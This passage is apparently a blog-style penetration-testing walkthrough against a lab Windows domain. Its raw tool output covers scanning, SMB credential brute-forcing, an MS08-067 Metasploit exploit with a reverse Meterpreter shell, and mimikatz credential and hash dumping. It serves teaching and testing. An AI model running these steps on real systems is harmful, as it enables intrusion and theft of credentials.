@@ -1,0 +1,2880 @@
+As a long time Linux user since in the early 90's, I still find it deeply satisfying relying primarily on text-based tools and old school "hackery" to get the job done. That's why I decided to outline several tools and techniques that can be used in order to compromise an entire Active Directory domain completely from the command line. To demonstrate, I setup a test LAB and domain (XEROSECURITY) which consists of a Windows 2012 AD Domain Controller (192.168.1.138) and a Windows XP Workstation (192.168.1.129) and my attacker machine (192.168.1.113) running Kali Linux 2.0. The info below offers a step by step guide to basic Windows penetration testing in a "Owned and Exposed" and "Phrack" ezine format. Respect out to all the old-school hackers who actually know what Phrack and Owned and Exposed is... This post is for you!
+-1N3
+
+
+TOOLS
+- Kali Linux https://www.kali.org/
+- Responder https://github.com/SpiderLabs/Responder.git
+- Sn1per https://github.com/1N3/Sn1per.git
+- BruteX https://github.com/1N3/BruteX.git
+- Metasploit hhttp://www.metasploit.com/
+- CrackMapExec https://github.com/byt3bl33d3r/CrackMapExec.git
+- pth-smbexec https://github.com/pentestgeek/smbexec.git
+- netdiscover http://nixgeneration.com/~jaime/netdiscover/
+- smb.sh SMBExec script https://gist.github.com/1N3/c784d60f6e5956e019c7#file-windows-post-exploitation-sh
+- metasploit-windows-post.rc script https://gist.github.com/1N3/7b852bb24e87ee6f7389
+- Hashcat http://hashcat.net/oclhashcat/
+
+
+DISCOVERY
+root@kali:/mnt/winxp# responder -A -f -i 192.168.1.113
+
+NBT Name Service/LLMNR Responder 2.0.
+Please send bugs/comments to: [email protected]
+To kill this script hit CRTL-C
+
+[+]NBT-NS, LLMNR & MDNS responder started
+[+]Loading Responder.conf File..
+Global Parameters set:
+Responder is bound to this interface: ALL
+Challenge set: 1122334455667788
+WPAD Proxy Server: False
+WPAD script loaded:  function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "RespProxySrv")||shExpMatch(host, "(*.RespProxySrv|RespProxySrv)")) return "DIRECT"; return 'PROXY ISAProxySrv:3141; DIRECT';}
+HTTP Server: ON
+HTTPS Server: ON
+SMB Server: ON
+SMB LM support: False
+Kerberos Server: ON
+SQL Server: ON
+FTP Server: ON
+IMAP Server: ON
+POP3 Server: ON
+SMTP Server: ON
+DNS Server: ON
+LDAP Server: ON
+FingerPrint hosts: True
+Serving Executable via HTTP&WPAD: OFF
+Always Serving a Specific File via HTTP&WPAD: OFF
+
+
+[+]Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.
+
+[Analyze mode: ICMP] You can ICMP Redirect on this network. This workstation (192.168.1.113) is not on the same subnet than the DNS server (206.248.154.22). Use python Icmp-Redirect.py for more details.
+[Analyze mode: ICMP] You can ICMP Redirect on this network. This workstation (192.168.1.113) is not on the same subnet than the DNS server (206.248.154.170). Use python Icmp-Redirect.py for more details.
+[Analyze mode: Browser]Datagram Request from IP: 192.168.1.129 hostname: TEST-3F6416AC49 via the: Workstation/Redirector Service. to: XEROSECURITY. Service: Domain controller service. This name is a domain controller.
+[!]Workstations/Servers detected on Domain XEROSECURITY:
+   -TEST-3F6416AC49
+   -WIN-8MSB2DD52P9
+[Analyze mode LANMAN]:
+[!]Domain detected on this network:
+   -WORKGROUP
+   -XEROSECURITY
+[!]Workstations/Servers detected on Domain XEROSECURITY:
+   -TEST-3F6416AC49
+   -WIN-8MSB2DD52P9
+
+
+root@kali:/mnt/winxp# netdiscover -r 192.168.1.0/24
+
+[3;J
+ Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                                         
+                                                                                                                                                                                                                                       
+ 7 Captured ARP Req/Rep packets, from 7 hosts.   Total size: 384                                                                                                                                                                       
+ _____________________________________________________________________________
+   IP            At MAC Address      Count  Len   MAC Vendor                   
+ ----------------------------------------------------------------------------- 
+ 192.168.1.129   00:0c:29:fb:8c:7c    01    042   VMware, Inc.                                                                                                                                                                                                                                                                                               
+ 192.168.1.138   00:0c:29:82:29:f9    01    042   VMware, Inc.                                                                                                                                                                         
+ 
+ 
+root@kali:/pentest/loot/# echo "192.168.1.129" >> /pentest/loot/win-targets.txt
+root@kali:/pentest/loot/# echo "192.168.1.138" >> /pentest/loot/win-targets.txt
+
+
+root@kali:/pentest/loot# sniper /pentest/loot/win-targets.txt airstrike
+
+
+                ____               
+    _________  /  _/___  ___  _____
+   / ___/ __ \ / // __ \/ _ \/ ___/
+  (__  ) / / // // /_/ /  __/ /    
+ /____/_/ /_/___/ .___/\___/_/     
+               /_/                 
+
+ + -- --=[http://crowdshield.com
+ + -- --=[sn1per v1.6 by 1N3
+                                         |
+                  |                      |
+                  |                    -/_\-
+                -/_\-   ______________(/ . \)______________
+   ____________(/ . \)_____________    \___/     <>
+   <>           \___/      <>    <>
+ 
+      ||
+      <>
+                            ||
+                            <>
+                                       ||
+                                       ||            BIG
+        _____               __         <>      (^)))^ BOOM!
+  BOOM!/((  )\       BOOM!((  )))            (     ( )
+ ---- (__()__))          (() ) ))           (  (  (   )
+     ||  |||____|------    \  (/   ___     (__\     /__)
+      |__|||  |     |---|---|||___|   |___-----|||||
+  |  ||.  |   |       |     |||                |||||
+      |__|||  |     |---|---|||___|   |___-----|||||
+  |  ||.  |   |       |     |||                |||||
+ __________________________________________________________
+ Bomb raid (contributed by Michael aka [email protected])
+
+ + -- --=[Launching airstrike: 192.168.1.129 
+################################### Running passive scans #########################
+TCP open	           epmap[  135]		from 192.168.1.129  ttl 128 
+TCP open	     netbios-ssn[  139]		from 192.168.1.129  ttl 128 
+TCP open	    microsoft-ds[  445]		from 192.168.1.129  ttl 128 
+TCP open	   ms-wbt-server[ 3389]		from 192.168.1.129  ttl 128 
+
+
+ + -- --=[Launching airstrike: 192.168.1.138 
+################################### Running passive scans #########################
+TCP open	            name[   42]		from 192.168.1.138  ttl 128 
+TCP open	          domain[   53]		from 192.168.1.138  ttl 128 
+TCP open	            http[   80]		from 192.168.1.138  ttl 128 
+TCP open	        kerberos[   88]		from 192.168.1.138  ttl 128 
+TCP open	           epmap[  135]		from 192.168.1.138  ttl 128 
+TCP open	     netbios-ssn[  139]		from 192.168.1.138  ttl 128 
+TCP open	            ldap[  389]		from 192.168.1.138  ttl 128 
+TCP open	    microsoft-ds[  445]		from 192.168.1.138  ttl 128 
+TCP open	           ldaps[  636]		from 192.168.1.138  ttl 128 
+
+                                 ^     ^
+        _   __  _   ____ _   __  _    _   ____
+       ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
+      | V V // o // _/ | V V // 0 // 0 // _/  
+      |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/    
+                                <   
+                                 ...'
+                                 
+    WAFW00F - Web Application Firewall Detection Tool
+    
+    By Sandro Gauci && Wendel G. Henrique
+
+Checking http://192.168.1.138
+Generic Detection results:
+The site http://192.168.1.138 seems to be behind a WAF 
+Reason: The server header is different when an attack is detected.
+The server header for a normal response is "Microsoft-IIS/8.5", while the server header a response to an attack is "Microsoft-HTTPAPI/2.0.",
+Number of requests: 12
+http://192.168.1.138 [200] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/8.5], IP[192.168.1.138], Microsoft-IIS[8.5], Title[IIS Windows Server]
+ENUMERATION
+root@kali:/pentest/loot# sniper /pentest/loot/win-targets.txt nuke 
+
+
+ 
+                              ____
+                      __,-~~/~    `---.
+                    _/_,---(      ,    )
+                __ /        <    /   )  \___
+ - ------===;;;'====------------------===;;;===----- -  -
+                   \/  ~'~'~'~'~'~\~'~)~'/
+                   (_ (   \  (     >    \)
+                    \_( _ <         >_>'
+                       ~ `-i' ::>|--"
+                           I;|.|.|
+                          <|i::|i|`.
+                        (` ^''`-' ')
+ --------------------------------------------------------- 
+ + -- --=[WARNING! Nuking ALL targets! 
+
+                ____               
+    _________  /  _/___  ___  _____
+   / ___/ __ \ / // __ \/ _ \/ ___/
+  (__  ) / / // // /_/ /  __/ /    
+ /____/_/ /_/___/ .___/\___/_/     
+               /_/                 
+
+ + -- --=[http://crowdshield.com
+ + -- --=[sn1per v1.6 by 1N3
+
+################################### Running recon #################################
+Server:		206.248.154.22
+Address:	206.248.154.22#53
+
+** server can't find 129.1.168.192.in-addr.arpa: NXDOMAIN
+
+Host 129.1.168.192.in-addr.arpa. not found: 3(NXDOMAIN)
+
+################################### Pinging host ###################################
+PING 192.168.1.129 (192.168.1.129) 56(84) bytes of data.
+64 bytes from 192.168.1.129: icmp_seq=1 ttl=128 time=0.415 ms
+
+--- 192.168.1.129 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.415/0.415/0.415/0.000 ms
+
+################################### Running port scan ##############################
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-01-30 14:45 EST
+Nmap scan report for 192.168.1.129
+Host is up (0.00026s latency).
+Not shown: 65530 closed ports
+PORT     STATE SERVICE       VERSION
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows 98 netbios-ssn
+445/tcp  open  microsoft-ds  Microsoft Windows XP microsoft-ds
+2869/tcp open  http          Microsoft HTTPAPI httpd 1.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/1.0
+|_http-title: Site doesn't have a title (text/html).
+3389/tcp open  ms-wbt-server Microsoft Terminal Service
+MAC Address: 00:0C:29:FB:8C:7C (VMware)
+Device type: general purpose
+Running: Microsoft Windows XP|2003
+OS CPE: cpe:/o:microsoft:windows_xp::sp2:professional cpe:/o:microsoft:windows_server_2003
+OS details: Microsoft Windows XP Professional SP2 or Windows Server 2003
+Network Distance: 1 hop
+Service Info: OSs: Windows, Windows 98, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_98, cpe:/o:microsoft:windows_xp
+
+Host script results:
+|_nbstat: NetBIOS name: TEST-3F6416AC49, NetBIOS user: < unknown>, NetBIOS MAC: 00:0c:29:fb:8c:7c (VMware)
+| smb-os-discovery: 
+|   OS: Windows XP (Windows 2000 LAN Manager)
+|   OS CPE: cpe:/o:microsoft:windows_xp::-
+|   Computer name: test-3f6416ac49
+|   NetBIOS computer name: TEST-3F6416AC49
+|   Domain name: xerosecurity.com
+|   Forest name: xerosecurity.com
+|   FQDN: test-3f6416ac49.xerosecurity.com
+|_  System time: 2016-01-30T14:45:39-05:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smbv2-enabled: Server doesn't support SMBv2 protocol
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.26 ms 192.168.1.129
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 26.25 seconds
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-01-30 14:45 EST
+Nmap scan report for 192.168.1.129
+Host is up (0.00026s latency).
+Not shown: 10 closed ports
+PORT    STATE         SERVICE     VERSION
+137/udp open          netbios-ns  Microsoft Windows NT netbios-ssn (workgroup: XEROSECURITY)
+138/udp open|filtered netbios-dgm
+MAC Address: 00:0C:29:FB:8C:7C (VMware)
+Too many fingerprints match this host to give specific OS details
+Network Distance: 1 hop
+Service Info: Host: TEST-3F6416AC49; OS: Windows NT; CPE: cpe:/o:microsoft:windows_nt
+
+Host script results:
+|_nbstat: NetBIOS name: TEST-3F6416AC49, NetBIOS user: < unknown>, NetBIOS MAC: 00:0c:29:fb:8c:7c (VMware)
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.26 ms 192.168.1.129
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 92.66 seconds
+
+################################### Running Intrusive Scans ########################
++ -- --=[Port 21 closed... skipping.
++ -- --=[Port 22 closed... skipping.
++ -- --=[Port 23 closed... skipping.
++ -- --=[Port 25 closed... skipping.
++ -- --=[Port 53 closed... skipping.
++ -- --=[Port 79 closed... skipping.
++ -- --=[Port 80 closed... skipping.
++ -- --=[Port 110 closed... skipping.
++ -- --=[Port 111 closed... skipping.
++ -- --=[Port 135 opened... running tests...
+rpcinfo: can't contact portmapper: RPC: Remote system error - Connection refused
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-01-30 14:47 EST
+Nmap scan report for 192.168.1.129
+Host is up (0.00015s latency).
+PORT    STATE SERVICE
+135/tcp open  msrpc
+MAC Address: 00:0C:29:FB:8C:7C (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
++ -- --=[Port 139 opened... running tests...
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Jan 30 14:47:12 2016
+
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... 192.168.1.129
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ===================================================== 
+|    Enumerating Workgroup/Domain on 192.168.1.129    |
+ ===================================================== 
+[+] Got domain/workgroup name: XEROSECURITY
+
+ ============================================= 
+|    Nbtstat Information for 192.168.1.129    |
+ ============================================= 
+Looking up status of 192.168.1.129
+	TEST-3F6416AC49 <00> -         B   Workstation Service
+	XEROSECURITY    <00> -  B   Domain/Workgroup Name
+	TEST-3F6416AC49 <20> -         B   File Server Service
+	XEROSECURITY    <1e> -  B   Browser Service Elections
+	XEROSECURITY    <1d> -         B   Master Browser
+	..__MSBROWSE__. <01> -  B   Master Browser
+
+	MAC Address = 00-0C-29-FB-8C-7C
+
+ ====================================== 
+|    Session Check on 192.168.1.129    |
+ ====================================== 
+[+] Server 192.168.1.129 allows sessions using username '', password ''
+
+ ============================================ 
+|    Getting domain SID for 192.168.1.129    |
+ ============================================ 
+could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED
+could not obtain sid for domain XEROSECURITY
+error: NT_STATUS_ACCESS_DENIED
+[+] Can't determine if host is part of domain or part of a workgroup
+
+ ======================================= 
+|    OS information on 192.168.1.129    |
+ ======================================= 
+[+] Got OS info for 192.168.1.129 from smbclient: Domain=[XEROSECURITY] OS=[Windows 5.1] Server=[Windows 2000 LAN Manager]
+[E] Can't get OS info with srvinfo: NT_STATUS_ACCESS_DENIED
+
+ ============================== 
+|    Users on 192.168.1.129    |
+ ============================== 
+[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED
+
+[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED
+
+ ========================================== 
+|    Share Enumeration on 192.168.1.129    |
+ ========================================== 
+[E] Can't list shares: NT_STATUS_ACCESS_DENIED
+
+[+] Attempting to map shares on 192.168.1.129
+
+ ===================================================== 
+|    Password Policy Information for 192.168.1.129    |
+ ===================================================== 
+[E] Unexpected error from polenum:
+
+[+] Attaching to 192.168.1.129 using a NULL share
+
+	[+] Trying protocol 445/SMB...
+
+	[!] Protocol failed: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
+
+	[+] Trying protocol 139/SMB...
+
+	[!] Protocol failed: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
+
+[E] Failed to get password policy with rpcclient
+
+
+ =============================== 
+|    Groups on 192.168.1.129    |
+ =============================== 
+
+[+] Getting builtin groups:
+[E] Can't get builtin groups: NT_STATUS_ACCESS_DENIED
+
+[+] Getting builtin group memberships:
+
+[+] Getting local groups:
+[E] Can't get local groups: NT_STATUS_ACCESS_DENIED
+
+[+] Getting local group memberships:
+
+[+] Getting domain groups:
+[E] Can't get domain groups: NT_STATUS_ACCESS_DENIED
+
+[+] Getting domain group memberships:
+
+ ======================================================================== 
+|    Users on 192.168.1.129 via RID cycling (RIDS: 500-550,1000-1050)    |
+ ======================================================================== 
+[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
+
+ ============================================== 
+|    Getting printer info for 192.168.1.129    |
+ ============================================== 
+could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED
+could not obtain sid for domain XEROSECURITY
+error: NT_STATUS_ACCESS_DENIED
+
+
+enum4linux complete on Sat Jan 30 14:47:13 2016
+
+Traceback (most recent call last):
+  File "bin/samrdump.py", line 159, in 
+    logger.init()
+AttributeError: 'module' object has no attribute 'init'
+Doing NBT name scan for addresses from 192.168.1.129
+
+IP address       NetBIOS Name     Server    User             MAC address      
+------------------------------------------------------------------------------
+192.168.1.129    TEST-3F6416AC49            00:0c:29:fb:8c:7c
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-01-30 14:47 EST
+Nmap scan report for 192.168.1.129
+Host is up (0.00020s latency).
+PORT    STATE SERVICE     VERSION
+139/tcp open  netbios-ssn Microsoft Windows 98 netbios-ssn
+MAC Address: 00:0C:29:FB:8C:7C (VMware)
+Service Info: OS: Windows 98; CPE: cpe:/o:microsoft:windows_98
+
+Host script results:
+| smb-brute: 
+|   administrator:password => Valid credentials
+|   guest: => Valid credentials
+|_  test:password => Valid credentials
+| smb-enum-groups: 
+|   Builtin\Administrators (RID: 544): Administrator, test
+|   Builtin\Users (RID: 545): test
+|   Builtin\Guests (RID: 546): Guest
+|   Builtin\Power Users (RID: 547): 
+|   Builtin\Backup Operators (RID: 551): 
+|   Builtin\Replicator (RID: 552): 
+|   Builtin\Remote Desktop Users (RID: 555): 
+|   Builtin\Network Configuration Operators (RID: 556): 
+|_  TEST-3F6416AC49\HelpServicesGroup (RID: 1001): SUPPORT_388945a0
+| smb-enum-sessions: 
+|   Active SMB sessions
+|     TEST is connected from NMAP for [just logged in, it's probably you], idle for [not idle]
+|     TEST is connected from NMAP for [just logged in, it's probably you], idle for [not idle]
+|     TEST is connected from NMAP for [just logged in, it's probably you], idle for [not idle]
+|_    TEST is connected from NMAP for [just logged in, it's probably you], idle for [not idle]
+| smb-enum-shares: 
+|   account_used: test
+|   ADMIN$: 
+|     warning: Couldn't get details for share: NT_STATUS_WERR_ACCESS_DENIED (srvsvc.netsharegetinfo)
+|     Anonymous access: 
+|     Current user access: 
+|   C: 
+|     warning: Couldn't get details for share: NT_STATUS_WERR_ACCESS_DENIED (srvsvc.netsharegetinfo)
+|     Anonymous access: 
+|     Current user access: READ/WRITE
+|   C$: 
+|     warning: Couldn't get details for share: NT_STATUS_WERR_ACCESS_DENIED (srvsvc.netsharegetinfo)
+|     Anonymous access: 
+|     Current user access: 
+|   Downloads: 
+|     warning: Couldn't get details for share: NT_STATUS_WERR_ACCESS_DENIED (srvsvc.netsharegetinfo)
+|     Anonymous access: 
+|     Current user access: READ/WRITE
+|   IPC$: 
+|     warning: Couldn't get details for share: NT_STATUS_WERR_ACCESS_DENIED (srvsvc.netsharegetinfo)
+|     Type: Not a file share
+|     Anonymous access: READ
+|_    Current user access: READ/WRITE
+|_smb-ls: ERROR: Script execution failed (use -d to debug)
+| smb-mbenum: 
+|   DFS Root
+|     WIN-8MSB2DD52P9  6.3  
+|   Domain Controller
+|     WIN-8MSB2DD52P9  6.3  
+|   Master Browser
+|     TEST-3F6416AC49  5.1  
+|   Potential Browser
+|     TEST-3F6416AC49  5.1  
+|   Server service
+|     TEST-3F6416AC49  5.1  
+|     WIN-8MSB2DD52P9  6.3  
+|   Time Source
+|     WIN-8MSB2DD52P9  6.3  
+|   Windows NT/2000/XP/2003 server
+|     TEST-3F6416AC49  5.1  
+|     WIN-8MSB2DD52P9  6.3  
+|   Workstation
+|     TEST-3F6416AC49  5.1  
+|_    WIN-8MSB2DD52P9  6.3  
+| smb-os-discovery: 
+|   OS: Windows XP (Windows 2000 LAN Manager)
+|   OS CPE: cpe:/o:microsoft:windows_xp::-
+|   Computer name: test-3f6416ac49
+|   NetBIOS computer name: TEST-3F6416AC49
+|   Domain name: xerosecurity.com
+|   Forest name: xerosecurity.com
+|   FQDN: test-3f6416ac49.xerosecurity.com
+|_  System time: 2016-01-30T14:47:42-05:00
+|_smb-print-text: false
+| smb-psexec: Can't find the service file: nmap_service.exe (or nmap_service).
+| Due to false positives in antivirus software, this module is no
+| longer included by default. Please download it from
+| https://nmap.org/psexec/nmap_service.exe
+|_and place it in nselib/data/psexec/ under the Nmap DATADIR.
+| smb-security-mode: 
+|   account_used: test
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb-system-info: ERROR: Script execution failed (use -d to debug)
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: false
+|_smbv2-enabled: Server doesn't support SMBv2 protocol
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 28.96 seconds
+                                                  
+IIIIII    dTb.dTb        _.---._
+  II     4'  v  'B   .'"".'/|\`.""'.
+  II     6.     .P  :  .' / | \ `.  :
+  II     'T;. .;P'  '.'  /  |  \  `.'
+  II      'T; ;P'    `. /   |   \ .'
+IIIIII     'YvP'       `-.__|__.-'
+
+I love shells --egypt
+
+
+Tired of typing 'set RHOSTS'? Click & pwn with Metasploit Pro
+Learn more on http://rapid7.com/metasploit
+
+       =[ metasploit v4.11.5-2016010401                   ]
++ -- --=[ 1518 exploits - 875 auxiliary - 257 post        ]
++ -- --=[ 437 payloads - 37 encoders - 8 nops             ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+RHOSTS => 192.168.1.129
+RHOST => 192.168.1.129
+[*] 192.168.1.129 - Pipes: \netlogon, \lsarpc, \samr, \browser, \atsvc, \DAV RPC SERVICE, \epmapper, \eventlog, \InitShutdown, \keysvc, \lsass, \ntsvcs, \protected_storage, \router, \scerpc, \srvsvc, \trkwks, \wkssvc
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+192.168.1.129 - UUID f50aac00-c7f3-428e-a022-a6b71bfb9d43 1.0 OPEN VIA BROWSER
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[-] 192.168.1.129:139 - Login Failed: The SMB server did not reply to our request
+[*] 192.168.1.129:445 - Windows XP Service Pack 2 (English)
+[+] 192.168.1.129:445 - IPC$ - (IPC) Remote IPC
+[+] 192.168.1.129:445 - C - (DISK) 
+[+] 192.168.1.129:445 - Downloads - (DISK) 
+[+] 192.168.1.129:445 - ADMIN$ - (DISK) Remote Admin
+[+] 192.168.1.129:445 - C$ - (DISK) Default share
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[*] 192.168.1.129 TEST-3F6416AC49 [  ] 
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+Login Failed: The SMB server did not reply to our request
+[*] 192.168.1.129 : XEROSECURITY\TEST-3F6416AC49$, XEROSECURITY\user
+[+] 192.168.1.129 - Found user: XEROSECURITY\user
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[*] 192.168.1.129:445 SMB - Starting SMB login bruteforce
+[*] 192.168.1.129 - This system allows guest sessions with any credentials
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[*] 192.168.1.129 PIPE(LSARPC) LOCAL(TEST-3F6416AC49 - 5-21-682003330-1606980848-839522115) DOMAIN(XEROSECURITY - 5-21-1088676282-494858925-2056655024)
+[*] 192.168.1.129 USER=Administrator RID=500
+[*] 192.168.1.129 USER=Guest RID=501
+[*] 192.168.1.129 GROUP=None RID=513
+[*] 192.168.1.129 USER=HelpAssistant RID=1000
+[*] 192.168.1.129 TYPE=4 NAME=HelpServicesGroup rid=1001
+[*] 192.168.1.129 USER=SUPPORT_388945a0 RID=1002
+[*] 192.168.1.129 USER=test RID=1003
+[*] 192.168.1.129 TEST-3F6416AC49 [Administrator, Guest, HelpAssistant, SUPPORT_388945a0, test ]
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[*] 192.168.1.129: - The target appears to be safe
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[*] 192.168.1.129:445 is running Windows XP SP2 (language:English) (name:TEST-3F6416AC49) (domain:XEROSECURITY)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[*] Started reverse TCP handler on 192.168.1.113:4444 
+[*] Trying return address 0x081ed5f2...
+[-] The SMB server did not reply to our request
+[*] Exploit completed, but no session was created.
+[*] Started reverse TCP handler on 192.168.1.113:4444 
+[*] Automatically detecting the target...
+[*] Fingerprint: Windows XP - Service Pack 2 - lang:English
+[*] Selected Target: Windows XP SP2 English (AlwaysOn NX)
+[*] Attempting to trigger the vulnerability...
+[*] Sending stage (957487 bytes) to 192.168.1.129
+[*] Meterpreter session 1 opened (192.168.1.113:4444 -> 192.168.1.129:1127) at 2016-01-30 14:49:30 -0500
+
+POST EXPLOITATION
+meterpreter > hashdump
+
+Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:447873b78295638165d0a1a58736c426:c379debb205ae80e84bda1b3d430b6c8:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:1534c54bed98875639d7e77ae9d51345:::
+test:1003:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
+meterpreter > 
+meterpreter > 
+meterpreter > getsystem
+
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+meterpreter > screenshot
+Screenshot saved to: /mnt/sde1/pentest/web/Sn1per/VTpkjmPC.jpeg
+meterpreter > shell
+Process 1316 created.
+Channel 1 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32> exit
+
+
+meterpreter > use mimikatz
+
+Loading extension mimikatz...success.
+
+
+meterpreter > kerberos
+
+[+] Running as SYSTEM
+[*] Retrieving kerberos credentials
+kerberos credentials
+====================
+
+AuthID    Package    Domain        User              Password
+------    -------    ------        ----              --------
+0;151748  NTLM       XEROSECURITY  user           
+0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE     
+0;55360   NTLM                                       
+0;999     Negotiate  XEROSECURITY  TEST-3F6416AC49$  
+0;996     Negotiate  NT AUTHORITY  NETWORK SERVICE   .mMS;.,)=B_>@:hk,eav(nDi)<-HrP*Ei?Z$M#fLACsTLYhvcobx*2Y.@8y9+
+
+meterpreter > livessp
+
+[+] Running as SYSTEM
+[*] Retrieving livessp credentials
+livessp credentials
+===================
+
+AuthID    Package    Domain        User              Password
+------    -------    ------        ----              --------
+0;151748  NTLM       XEROSECURITY  user           n.a. (livessp KO)
+0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE     n.a. (livessp KO)
+0;996     Negotiate  NT AUTHORITY  NETWORK SERVICE   n.a. (livessp KO)
+0;55360   NTLM                                       n.a. (livessp KO)
+0;999     Negotiate  XEROSECURITY  TEST-3F6416AC49$  n.a. (livessp KO)
+
+meterpreter > msv
+
+[+] Running as SYSTEM
+[*] Retrieving msv credentials
+msv credentials
+
+===============
+
+AuthID    Package    Domain        User              Password
+------    -------    ------        ----              --------
+0;996     Negotiate  NT AUTHORITY  NETWORK SERVICE   lm{ 00000000000000000000000000000000 }, ntlm{ a93c420761d5d783f1c3c674482e7d47 }
+0;55360   NTLM                                       lm{ 00000000000000000000000000000000 }, ntlm{ a93c420761d5d783f1c3c674482e7d47 }
+0;151748  NTLM       XEROSECURITY  user           lm{ e52cac67419a9a2217e4c3576fe93615 }, ntlm{ b490b475e987909ae9bd83a65aa94665 }
+0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE     n.s. (Credentials KO)
+0;999     Negotiate  XEROSECURITY  TEST-3F6416AC49$  n.s. (Credentials KO)
+
+meterpreter > ssp
+
+[+] Running as SYSTEM
+[*] Retrieving ssp credentials
+ssp credentials
+===============
+
+AuthID  Package  Domain  User  Password
+------  -------  ------  ----  --------
+
+meterpreter > tspkg
+
+[+] Running as SYSTEM
+[*] Retrieving tspkg credentials
+tspkg credentials
+=================
+
+AuthID    Package    Domain        User              Password
+------    -------    ------        ----              --------
+0;151748  NTLM       XEROSECURITY  user           n.a. (tspkg KO)
+0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE     n.a. (tspkg KO)
+0;996     Negotiate  NT AUTHORITY  NETWORK SERVICE   n.a. (tspkg KO)
+0;55360   NTLM                                       n.a. (tspkg KO)
+0;999     Negotiate  XEROSECURITY  TEST-3F6416AC49$  n.a. (tspkg KO)
+
+meterpreter > wdigest
+[+] Running as SYSTEM
+[*] Retrieving wdigest credentials
+wdigest credentials
+===================
+
+AuthID    Package    Domain        User              Password
+------    -------    ------        ----              --------
+0;55360   NTLM                                       
+0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE     
+0;999     Negotiate  XEROSECURITY  TEST-3F6416AC49$  .mMS;.,)=B_>@:hk,eav(nDi)<-HrP*Ei?Z$M#fLACsTLYhvcobx*2Y.@8y9+
+0;996     Negotiate  NT AUTHORITY  NETWORK SERVICE   .mMS;.,)=B_>@:hk,eav(nDi)<-HrP*Ei?Z$M#fLACsTLYhvcobx*2Y.@8y9+
+0;151748  NTLM       XEROSECURITY  user           Password123$
+
+
+
+meterpreter > background
+[*] Backgrounding session 1...
+[*] You have active sessions open, to exit anyway type "exit -y"
+msf exploit(ms08_067_netapi) >
+
+msf post(golden_ticket) > use post/windows/gather/cachedump 
+msf post(cachedump) > show options
+
+Module options (post/windows/gather/cachedump):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+msf post(cachedump) > setg SESSION 1
+
